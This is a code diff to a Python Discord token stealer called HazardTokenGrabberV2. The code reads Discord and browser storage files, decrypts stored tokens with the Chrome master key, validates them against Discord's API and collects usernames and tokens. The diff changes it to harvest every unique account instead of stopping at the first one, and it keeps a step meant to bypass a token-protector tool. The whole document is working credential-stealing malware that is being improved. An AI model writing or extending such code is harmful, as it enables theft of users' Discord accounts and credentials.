@@ -62,7 +62,8 @@ class HazardTokenGrabberV2(Functions):
         self.encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"
 
         self.sep = os.sep
-        self.tokens = []
+        self.seen_tokens = set()
+        self.accounts = {}
         self.chrome_key = self.get_master_key(ntpath.join(self.chrome_user_data, "Local State"))
 
     def try_extract(func):
@@ -74,27 +75,39 @@ class HazardTokenGrabberV2(Functions):
                 pass
         return wrapper
 
-    def checkToken(self, tkn: str) -> str:
+    def checkToken(self, tkn: str) -> bool:
+        if tkn in self.seen_tokens:
+            return False
+        self.seen_tokens.add(tkn)
+
         try:
             r = httpx.get(
                 url=self.discordApi,
                 headers=self.get_headers(tkn),
                 timeout=5.0
             )
+            if r.status_code == 200:
+                user = r.json()
+                uid = user["id"]
+                if uid not in self.accounts:
+                    self.accounts[uid] = {
+                        "username": user.get("display_name") or user.get("username"),
+                        "display_name": user.get("global_name") or user.get("username"),
+                        "token": tkn
+                    }
+                return True
         except (httpx.ConnectTimeout, httpx.TimeoutException):
             pass
-        if r.status_code == 200 and tkn not in self.tokens:
-            self.tokens.append(tkn)
-            return True
-
+        return False
 
     async def init(self):
         await self.bypassTokenProtector()
-
         self.grab_tokens()
 
-        global tokens
-        tokens = self.tokens
+        return {
+            "unique": len(self.accounts),
+            "accounts": self.accounts
+        }
 
 
     async def bypassTokenProtector(self):
@@ -178,16 +191,14 @@ class HazardTokenGrabberV2(Functions):
                         for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                             for y in re.findall(self.encrypted_regex, line):
                                 token = self.decrypt_val(b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming + f'\\{disc}\\Local State'))
-                                if self.checkToken(token):
-                                    return
+                                self.checkToken(token)
             else:
                 for file_name in os.listdir(path):
                     if file_name[-3:] not in ["log", "ldb"]:
                         continue
                     for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                         for token in re.findall(self.regex, line):
-                            if self.checkToken(token):
-                                return
+                            self.checkToken(token)
 
         if ntpath.exists(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
             for path, _, files in os.walk(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
@@ -203,6 +214,4 @@ class HazardTokenGrabberV2(Functions):
 
 
 def get_token():
-    asyncio.run(HazardTokenGrabberV2().init())
-    return(tokens)
-
+    return asyncio.run(HazardTokenGrabberV2().init())
